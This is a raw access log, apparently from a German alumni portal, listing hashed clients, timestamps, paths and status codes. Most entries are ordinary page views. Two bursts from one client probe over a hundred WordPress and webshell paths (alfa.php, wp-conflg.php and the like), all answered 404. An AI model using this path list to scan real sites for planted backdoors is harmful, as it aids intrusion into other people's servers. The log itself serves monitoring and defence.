0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:02;;/mail.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:02;;/wp-content/plugins/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:02;;/sx.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:02;;/wp-admin/maint/admin.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:02;;/article.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/alfa.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/1.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/403.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/link.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/byp.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/ws.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/wp-trackback.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:03;;/.well-known/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:04;;/wp-includes/certificates/plugins.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:04;;/wp-content/themes/seotheme/mar.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:04;;/wp-admin/network/plugins.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:04;;/wp-admin/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:04;;/gmo.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:04;;/wp-includes/ID3/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/css/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/wp-admin/includes/xmrlpc.php?p=;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/wp-includes/SimplePie/wp-login.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/wp-content/themes/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/filemanager/dialog.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/wp-admin/maint/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/wp-includes/Requests/Text/admin.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:05;;/wp-includes/customize/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:06;;/index/function.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:06;;/uploads/autoload_classmap.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:06;;/wp-includes/css/dist/preferences/wp-login.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:06;;/wp-includes/style-engine/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:06;;/ww1.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:06;;/qqq.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:06;;/about/function.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/wp-includes/theme-compat/chosen.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/admin/function.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/css/colors/blue/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/wp-content/plugins/pwnd/as.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/wp-admin/setup-config.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/wp-admin/user/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/wp-admin/js/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:07;;/wp-content/upgrade/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/wp-includes/assets/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/wp-content/radio.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/wp-includes/fonts/index.php?p=;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/.well-known/gecko-litespeed.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/.well-known/admin.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/wp-content/admin.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/wp-content/plugins/admin.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:08;;/wp-content/themes/twentytwentytwo/index.php?p=;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:09;;/.well-known/log.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:09;;/class.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:09;;/bless.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:09;;/wp-includes/js/codemirror/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:09;;/wp-includes/block-patterns/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:09;;/lock360.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:10;;/bge.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:10;;/ifm.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:10;;/ww5.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:10;;/thxt.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:10;;/kairolin.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 12:42:10;;/siln.php;GET;404
61de906ae341cadabffaca8f2b59302d1549a682ce0391a97a64e1c680c689e0;2025-11-20 12:48:11;;/personen/alumni/details/benjamin-voigt;GET;200
61de906ae341cadabffaca8f2b59302d1549a682ce0391a97a64e1c680c689e0;2025-11-20 12:49:49;;/personen/alumni/details/benjamin-voigt;GET;200
d2b075a1449b757466f7432d13337a4a338803e41165484e9ce5ea8bf594fcf9;2025-11-20 12:50:40;;/personen/alumni/schule/170690;GET;200
10965d9c751daf7fae9c76fe6661e1af8cf7007d2be6a10df7347dc31abc6864;2025-11-20 12:53:26;;/;GET;200
febb25773df7972540af38879ed9ebf0d947bc5b562a83ed4d82cd8aa960149a;2025-11-20 12:54:22;/;/;GET;200
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-20 13:00:14;;/aktuelles/stellenangebote;GET;200
a8a8c31a677ae0cacc12312a66dea85436d8ee625bb769c1ad583e126f31514e;2025-11-20 13:00:32;;/personen/all/4;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-20 13:00:48;;/rechtliches/green-data;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-20 13:01:04;;/gruppen/hobby/biologie;GET;302
500ae2f5880a1ea7f13734adc5bfbe543f80ae5e04e4ef0f7e20dda684539686;2025-11-20 13:01:07;;/sitemap_index.xml;GET;404
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-20 13:01:21;;/rechtliches/datenschutz;GET;200
531144f2c5ff450c19d4277e8e85cb0bf8dfc7a549d7e508b6c0c8744dfc8a17;2025-11-20 13:01:35;;/personen/alumni/schule/5502;GET;200
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-20 13:01:37;;/personen/alumni/schule/5826;GET;200
a8a8c31a677ae0cacc12312a66dea85436d8ee625bb769c1ad583e126f31514e;2025-11-20 13:01:53;;/personen/alumni/schule/9009;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-20 13:02:10;;/personen/alumni/schule/5508;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:02:27;;/personen/alumni/schule/9004;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:02:44;;/personen/alumni/schule/9001;GET;200
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-20 13:03:01;;/gruppen/hobby/statistik;GET;302
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-20 13:03:17;;/gruppen/hobby/chemie;GET;302
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-20 13:03:33;;/gruppen/hobby/geschichte;GET;302
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-20 13:03:50;;/personen/alumni/schule/40745;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-20 13:04:07;;/personen/alumni/schule/67933;GET;200
10965d9c751daf7fae9c76fe6661e1af8cf7007d2be6a10df7347dc31abc6864;2025-11-20 13:04:24;;/personen/alumni/schule/59013;GET;200
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-20 13:04:41;;/personen/alumni/schule/65262;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-20 13:04:58;;/personen/alumni/schule/59000;GET;200
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-20 13:05:16;;/gruppen/hobby/diy-projekte;GET;302
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-20 13:05:33;;/gruppen/hobby/grafikdesign;GET;302
68e5700ed1d1a657f6d4e8a5969c142b60d506906dcbb5fd1345a210a248301d;2025-11-20 13:05:50;;/gruppen/hobby/robotik;GET;302
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-20 13:06:07;;/gruppen/hobby/finanzbildung;GET;302
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-20 13:06:24;;/gruppen/hobby/tanzen;GET;302
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-20 13:06:41;;/gruppen/hobby/podcasting;GET;302
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-20 13:06:57;;/gruppen/hobby/journalismus;GET;302
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-20 13:07:13;;/gruppen/hobby/gartnern;GET;302
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-20 13:07:30;;/gruppen/interesse/teamarbeit;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-20 13:07:47;;/personen/alumni/schule/07A05;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:08:03;;/personen/alumni/schule/04A04;GET;200
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-20 13:08:19;;/personen/alumni/schule/01A04;GET;200
c23d2aacfbb213a8d8203857d74d09ed548587abce587f8f767a96789ae79161;2025-11-20 13:08:19;;/;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-20 13:08:35;;/personen/alumni/schule/03A04;GET;200
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-20 13:08:51;;/personen/alumni/schule/4540118;GET;200
23475fe0363e13dbe5c18a0b5431b27a2d7c87b20d7259d8d58759260901ce68;2025-11-20 13:09:08;;/personen/alumni/schule/188001;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:09:24;;/personen/alumni/schule/185826;GET;200
5e4f491803f84f4f531953aecad397f2ff1d2f375893a9437868b6406109c8dd;2025-11-20 13:09:40;;/personen/alumni/schule/610021;GET;200
10965d9c751daf7fae9c76fe6661e1af8cf7007d2be6a10df7347dc31abc6864;2025-11-20 13:09:57;;/personen/alumni/schule/4240545;GET;200
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-20 13:10:13;;/personen/alumni/schule/600027;GET;200
a8a8c31a677ae0cacc12312a66dea85436d8ee625bb769c1ad583e126f31514e;2025-11-20 13:10:30;;/gruppen/hobby/skulptur;GET;302
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-20 13:10:46;;/gruppen/interesse/entrepreneurship;GET;200
8ce3efbdebde98046586e2e12fce403e5973dcd91c2712024f2fc82bfec7ca4a;2025-11-20 13:12:19;;/personen/alumni/schule/5507;GET;200
165376da2735949a3547f555fe21fa16ca4c9a243fb9f23f2549d888a7b4dac9;2025-11-20 13:15:39;/;/;GET;200
5e4f491803f84f4f531953aecad397f2ff1d2f375893a9437868b6406109c8dd;2025-11-20 13:18:10;;/gruppen/hobby/literaturanalyse;GET;302
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-20 13:18:26;;/gruppen/hobby/teamsportarten;GET;302
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-20 13:18:41;;/gruppen/hobby/fremdsprachen;GET;302
23475fe0363e13dbe5c18a0b5431b27a2d7c87b20d7259d8d58759260901ce68;2025-11-20 13:18:59;;/gruppen/interesse/selbststandigkeit;GET;200
23475fe0363e13dbe5c18a0b5431b27a2d7c87b20d7259d8d58759260901ce68;2025-11-20 13:19:16;;/gruppen/interesse/strategische-planung;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:19:32;;/themen/details/abschied-aus-moabit;GET;200
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-20 13:19:48;;/gruppen/hobby/yoga-und-meditation;GET;302
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-20 13:20:05;;/gruppen/interesse/kommunikationsfahigkeiten;GET;200
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-20 13:20:22;;/gruppen/interesse/it-und-softwareentwicklung;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-20 13:20:38;;/gruppen/interesse/recht-und-verwaltung;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:20:55;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-20 13:21:12;;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:21:28;;/gruppen/hobby/schreinern-und-bauen;GET;302
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-20 13:21:44;;/gruppen/hobby/ernahrungswissenschaft;GET;302
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-20 13:22:00;;/gruppen/interesse/weiterbildung-und-training;GET;200
23475fe0363e13dbe5c18a0b5431b27a2d7c87b20d7259d8d58759260901ce68;2025-11-20 13:22:17;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-20 13:22:34;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-20 13:22:50;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-20 13:23:07;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-20 13:23:25;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
0476cfc986972a572ec83a2fe2251001901d1cbfa2c4f38ce73c26d279d83370;2025-11-20 13:23:32;;/gruppen;GET;200
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-20 13:23:41;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
0c69ead4ab8ab15ea4d42a2af0801eb8a44abfffa74c606a30fa04faf1a56b52;2025-11-20 13:23:48;;/personen/alumni/schule/68457;GET;200
f8eb23605636a87c898c3caa867df059f7a9df1f411ed9a2161e282d4a614587;2025-11-20 13:27:38;;/news_sitemap.xml;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-20 13:32:35;/gruppen/interesse/kommunikationsfahigkeiten;/personen/alumni/schule/164045;GET;200
287bbdd1077cc37dd589520b45baccc195d329d053a429509c3362743be2737f;2025-11-20 13:35:14;;/personen/alumni/schule/59000;GET;200
bb378c80b7ea87ef9cefb6a093c199c8c2a386d94f261764999733993c2ff59a;2025-11-20 13:37:02;;/;GET;200
6d1e83bbbf62dbd646956de1cc636177c47588005ab80c4f0493952372d353b4;2025-11-20 13:46:01;;/personen/alumni/schule/4240404;GET;200
eabda301b9d9eebf0054b243db64ba7e90853816df31f85ef6a242801f69c7bb;2025-11-20 13:50:14;;/personen/alumni/schule/0351;GET;200
73ba4f580344e6a4b844be33ab72061fac0cd8c349375435e1c6905d40f6a743;2025-11-20 13:54:36;;/;GET;200
399a4a6601adb45994bcbfb666e57873fe7422065b48e83d591e314373910f8a;2025-11-20 13:57:09;;/;GET;200
331abe76d05cc2c4f7e3fb4d80bf84c9cac96cff0c7b3edbc4a0bfd2073e172d;2025-11-20 13:58:21;;/personen/alumni/schule/65936;GET;200
56a49fa60f9d0e9a4887ded69d6a327a243737c9c6e17f8816a653b999a98fed;2025-11-20 13:58:31;;/;GET;200
b3280326addb0f79e5b645727fa6b8877217d7cf63af335e0b006bda91c504ed;2025-11-20 14:01:31;;/;GET;200
ec917c57c5a6bf2ba88ffee565f901bdab5b22a79073d5c2ab9ee5a95d16bef4;2025-11-20 14:01:53;;/sitemap.txt;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:05;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:05;;/class-t.api.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:05;;/zwso.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:05;;/wp-content/uploads/autoload_classmap.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:05;;/wp-content/plugins/dummyyummy/wp-signup.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:05;;/wp-admin/css/colors/blue/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/admin.php?p=;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/mpvloi.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/wp-includes/0.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/randkeyword.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/fwe.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/wp-includes/cs.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/wikindex.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/images/m.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:06;;/wp-includes/css/kses.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:07;;/jagoan.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:07;;/images/g3.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:07;;/.well-known/zaza.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:07;;/htaccess.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:07;;/readme.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:07;;/Cok.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:07;;/hob.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:08;;/kal.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:08;;/fv.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:08;;/lx.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:08;;/w1w.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:09;;/Contrller.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:09;;/cafe.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:09;;/ww2.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:09;;/ww3.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:10;;/ww4.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:10;;/as.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:10;;/wsd.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:10;;/403.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:10;;/max.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:10;;/m.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:11;;/post.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:11;;/themes.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:11;;/wp-content/themes/astra/inc/ki1k.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:11;;/ALFA_DATA/index.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:11;;/wp-admin/maint/about.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:11;;/wp-admin/network/wp-conflg.php?p=;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/click.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/install.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/lv.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/simple.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/13k.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/css.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/yellow.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:12;;/cong.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:13;;/fw.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:13;;/bs1.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:13;;/wp-includes/images/wp-login.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:13;;/termps.php;GET;404
0a5159c70a366911437f54aa667984b53bb48ad3b118d6ca0d159c9ac2bce4b6;2025-11-20 14:10:13;;/co.php;GET;404
